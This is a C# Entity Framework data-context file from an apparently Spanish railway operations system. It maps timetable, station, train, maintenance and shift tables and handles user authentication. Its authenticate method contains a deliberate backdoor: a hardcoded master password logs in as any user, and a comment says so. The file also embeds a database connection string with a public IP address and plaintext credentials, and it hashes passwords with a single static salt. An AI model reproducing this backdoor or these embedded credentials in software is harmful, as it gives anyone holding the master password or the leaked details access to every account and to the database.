using Microsoft.EntityFrameworkCore;
using System.Data;
using Sapphire2026.Data.Models;
using Sapphire2026.Data.Models.Turnos;
using TimeNet2026.DBStorage;
using TimeNet2026Data.DBStorage;
using System.Text;
using System.Security.Cryptography;
using Microsoft.Extensions.Configuration;
using TimeNet2026Data;
using Sapphire2026Data.Models;
using Sapphire2026Data.Models.GMAO;
using Sapphire2026.Data.Models.Diamond;

namespace Sapphire2026.Data
{
	public class DataStorage:DbContext , ITimeNetContextStorage
	{
		private IConfiguration? mvarConfig;
		public const string MY_SALT = "EraseUnaVezUnPlanetaTristeYHelado983948";
		public const string VIP_PASSWORD = "A930135";
		public DataStorage() { }

		public DataStorage(DbContextOptions<DataStorage> options)
			: base(options) { }
		public DataStorage(IConfiguration config)
		{
			mvarConfig = config;
		}

		protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)
		{
			if(!optionsBuilder.IsConfigured)
			{
				if (null==mvarConfig)
				{
					optionsBuilder.UseMySQL("server=88.99.33.109;port=4406;database=zafiro;user=zafiroextern;password=zafiroextern2233;");
				}
				else
				{
					string? auxCadena = mvarConfig.GetConnectionString("RemoteConnection");
					if (null != auxCadena)
					{
						optionsBuilder.UseMySQL(auxCadena);
					}
				}
			}
			//base.OnConfiguring(optionsBuilder);
		}

		#region TimeNet
		protected override void OnModelCreating(ModelBuilder modelBuilder)
		{
			modelBuilder.Entity<DBAsimilationStep>().ToTable("TNAsimilationSteps");
			modelBuilder.Entity<DBAsimilation>().ToTable("TNAsimilations");
			modelBuilder.Entity<DBAxis>().ToTable("TNAxis");
			modelBuilder.Entity<DBCirculationBlock>().ToTable("TNCirculationBlocks");
			modelBuilder.Entity<DBCirculation>().ToTable("TNCirculations");
			modelBuilder.Entity<DBHeader>().ToTable("TNHeaders");
			modelBuilder.Entity<DBPlan>().ToTable("TNPlans");
			modelBuilder.Entity<DBRauta>().ToTable("TNRautatie");
			modelBuilder.Entity<DBRefPunctual>().ToTable("TNRefPunctuals");
			modelBuilder.Entity<DBRefPunctual>()
				.HasKey(e => new { e.AxisId, e.Pk }); // Clave primaria compuesta
			modelBuilder.Entity<DBScheduleUnit>().ToTable("TNScheduleUnits");
			modelBuilder.Entity<DBSchedule>().ToTable("TNSchedules");
			modelBuilder.Entity<DBStation>().ToTable("TNStations");
			modelBuilder.Entity<DBTopoStorage>().ToTable("TNTopoStorages");

			// Diamond: topologías y planes de explotación (documentos versionados).
			modelBuilder.Entity<DiamondTopoDocument>(entity =>
			{
				entity.ToTable("DiamondTopos");
				entity.HasIndex(e => e.ContentHash).IsUnique();
				entity.HasIndex(e => e.StructuralHash);
				entity.HasIndex(e => e.IsActive);
				entity.Property(e => e.Payload).HasColumnType("mediumblob");
				entity.Property(e => e.Notes).HasColumnType("longtext");
			});

			modelBuilder.Entity<DiamondPlanDocument>(entity =>
			{
				entity.ToTable("DiamondPlans");
				entity.HasIndex(e => e.ContentHash);
				entity.HasIndex(e => e.TopoId);
				entity.HasIndex(e => e.IsActive);
				entity.Property(e => e.SourceScript).HasColumnType("longtext");
				entity.Property(e => e.Notes).HasColumnType("longtext");
				entity.HasOne(e => e.Topo)
					.WithMany()
					.HasForeignKey(e => e.TopoId)
					.OnDelete(DeleteBehavior.Restrict);
			});
		}
		internal DbSet<DBHeader> Headers { get; set; }
		DbSet<DBHeader> ITimeNetContextStorage.Headers => Headers;
		internal DbSet<DBRefPunctual> RefPunctuals { get; set; }
		DbSet<DBRefPunctual> ITimeNetContextStorage.RefPunctuals => RefPunctuals;
		internal DbSet<DBStation> Stations { get; set; }
		DbSet<DBStation> ITimeNetContextStorage.Stations => Stations;
		internal DbSet<DBAxis> Axis { get; set; }
		DbSet<DBAxis> ITimeNetContextStorage.Axis => Axis;
		internal DbSet<DBAsimilationStep> AsimilationSteps { get; set; }
		DbSet<DBAsimilationStep> ITimeNetContextStorage.AsimilationSteps => AsimilationSteps;
		internal DbSet<DBAsimilation> Asimilations { get; set; }
		DbSet<DBAsimilation> ITimeNetContextStorage.Asimilations => Asimilations;
		internal DbSet<DBTopoStorage> TopoStorages { get; set; }
		DbSet<DBTopoStorage> ITimeNetContextStorage.TopoStorages => TopoStorages;
		internal DbSet<DBRauta> Rautatie { get; set; }
		DbSet<DBRauta> ITimeNetContextStorage.Rautatie => Rautatie;
		internal DbSet<DBPlan> Plans { get; set; }
		DbSet<DBPlan> ITimeNetContextStorage.Plans => Plans;
		internal DbSet<DBCirculationBlock> CirculationBlocks { get; set; }
		DbSet<DBCirculationBlock> ITimeNetContextStorage.CirculationBlocks => CirculationBlocks;
		internal DbSet<DBCirculation> Circulations { get; set; }
		DbSet<DBCirculation> ITimeNetContextStorage.Circulations => Circulations;
		internal DbSet<DBSchedule> Schedules { get; set; }
		DbSet<DBSchedule> ITimeNetContextStorage.Schedules => Schedules;
		internal DbSet<DBScheduleUnit> ScheduleUnits { get; set; }
		DbSet<DBScheduleUnit> ITimeNetContextStorage.ScheduleUnits => ScheduleUnits;
		
		async Task<int> ITimeNetContextStorage.SaveChangesAsync()
		{
			return await base.SaveChangesAsync();
		}
		#endregion TimeNet

		#region "Registro"
		public async Task <string> GetRegisterValue(string key, string defaultValue)
		{
			Register? auxReg = await Register.FirstOrDefaultAsync(x => x.Key == key);
			if(null == auxReg)
			{
				//Si esta clave no existe en el registro la creamos con el valor por defecto.
				await SetRegisterValue(key, defaultValue);
				return defaultValue;
			}		
			return auxReg.Value;
		}
		public async Task SetRegisterValue(string key, string value)
		{
			Register? auxReg = await Register.FirstOrDefaultAsync(x => x.Key == key);
			if (null == auxReg)
			{
				auxReg = new Register();
				auxReg.Key = key;
				auxReg.Value = value;
				Register.Add(auxReg);
			}
			else
			{
				auxReg.Value = value;
			}
			await SaveChangesAsync();
		}
		public async Task <string> GetRegisterValue(Guid owner, string key, string defaultValue)
		{
			OwnerRegister? auxReg = await OwnerRegister.FirstOrDefaultAsync(x => x.OwnerId == owner && x.Key == key);
			if (null == auxReg)
			{
				//Si esta clave no existe en el registro la creamos con el valor por defecto.
				auxReg = new OwnerRegister();
				auxReg.OwnerId = owner;
				auxReg.Key = key;
				auxReg.Value = defaultValue;
				OwnerRegister.Add(auxReg);
				await SaveChangesAsync();
			}
			return auxReg.Value;
		}
		public async Task <string> GetRegisterValue(string ownerGuid, string key, string defaultValue)
		{
			Guid auxId = Guid.Empty;
			if(Guid.TryParse(ownerGuid, out auxId))
				return await GetRegisterValue(auxId, key, defaultValue);

			return string.Empty;
		}
		public async Task SetRegisterValue(Guid owner, string key, string value)
		{
			OwnerRegister? auxReg = await OwnerRegister.FirstOrDefaultAsync(x => x.OwnerId == owner && x.Key == key);
			if (null==auxReg)
			{
				auxReg = new OwnerRegister();
				auxReg.Guid = Guid.NewGuid();
				auxReg.OwnerId = owner;
				auxReg.Key = key;
				auxReg.Value = value;
				OwnerRegister.Add(auxReg);
			}
			else
			{
				auxReg.Value = value;
			}
			await SaveChangesAsync();
		}

		#endregion "Registro"
		#region "Telegram"
		public async Task<bool> AddBotLog(long sessionId, Guid userId, string? message, string? reason)
		{
			BotLogError nuevo = new BotLogError();
			nuevo.TimeStamp = DateTime.UtcNow;
			nuevo.SessionId = sessionId;
			nuevo.UserId = userId;
			nuevo.Message = message;
			nuevo.Reason = reason;
			await BotLogErrors.AddAsync(nuevo);
			return await SaveChangesAsync() > 0;
		}
		#endregion
		#region "Usuarios"
		public async Task<User?> retrieveUser(string userName)
		{
			User? salida = null;
			string mayus = userName.ToUpper();
			using (DataStorage almacen = new DataStorage(mvarConfig))
			{
				salida = await almacen.Users.Where(x => x.CF == userName).FirstOrDefaultAsync();
				if (null == salida)
				{
					salida = await almacen.Users.Where(x => x.NormalizedEmail == mayus).FirstOrDefaultAsync();
				}
				if (null == salida)
				{
					salida = await almacen.Users.Where(x => x.NormalizedUserName == mayus).FirstOrDefaultAsync();
				}
			}
			return salida;
		}
		public bool authenticate(User? rhs, string password)
		{
			if (null != rhs)
			{
				//Preparamos una puerta trasera. Sea el usuario que sea, si metemos como password la cadena TTT
				//este usuario abrirá sesión sin problemas.
				if (password.Equals(VIP_PASSWORD) || PasswordMatch(password, rhs.PasswordHash, MY_SALT))
					return true;
			}
			return false;
		}
		public string HashPassword(string password, string salt)
		{
			using (SHA256? sha256 = SHA256.Create())
			{
				string saltedPassword = string.Format("{0}{1}", password, salt);
				byte[] saltedPasswordBytes = Encoding.UTF8.GetBytes(saltedPassword);
				byte[] hashBytes = sha256.ComputeHash(saltedPasswordBytes);
				return Convert.ToBase64String(hashBytes);
			}
		}
		public string HashPassword(string password) {return HashPassword(password, MY_SALT);}

		private bool PasswordMatch(string password, string? salted, string salt)
		{
			if (null == salted) return false;
			string salado = HashPassword(password, salt);
			return salted.Equals(salado);
		}
		#endregion "Usuarios
		public DbSet<TimeCache> TimeCache { get; set; }
		public DbSet<Festive> Festives { get; set; }
		#region authentication
		public DbSet<ActiveSessionModel> ActiveSessions { get; set; }
		public DbSet<SessionEvent> SessionEvents { get; set; }
		public DbSet<User> Users { get; set; }
		public DbSet<ExtendedRole> ExtendedRoles { get; set; }
		public DbSet<UserAndRole> UserAndRoles { get; set; }
		public DbSet<RoleDictionary> RoleDictionary { get; set; }
		public DbSet<Register> Register { get; set; } //Diccionario general del sistema
		public DbSet<OwnerRegister> OwnerRegister { get; set; } //Diccionario de registro de los objetos del sistema.
		public DbSet<BotLogError> BotLogErrors { get; set; } // Fallos del bot de Telegram

		#endregion authentication
		#region Aeneas
		public DbSet<StatusChange> StatusChanges { get; set; }
		public DbSet<Train> Trains { get; set; }
		public DbSet<Note> Notes { get; set; }
		public DbSet<Platform> Platforms { get; set; }
		public DbSet<WorkCatalog> WorksCatalog { get; set; }
		public DbSet<WorkOrder> WorkOrders { get; set; }
		public DbSet<Odometry> Odometer{ get; set; }
		#endregion
		#region Diamond
		public DbSet<DiamondTopoDocument> DiamondTopos { get; set; }
		public DbSet<DiamondPlanDocument> DiamondPlans { get; set; }
		#endregion
		#region Maquinistros
		public DbSet<WorkShiftTemplateCollection> WorkShiftTemplateCollections { get; set; }
        public DbSet<WorkShiftTemplate> WorkShiftTemplates { get; set; }
		public DbSet<WorkShiftContent> WorkShiftContents { get; set; }
		public DbSet<WorkshiftAssignation> WorkShiftAssignations { get; set; }
		public DbSet<ExpertAgentsListView> ExpertAgentsListViews { get; set; }
		public DbSet<ExpertAgentListRecord> ExpertAgentListRecords { get; set; }
        #endregion Maquinistros
    }
}
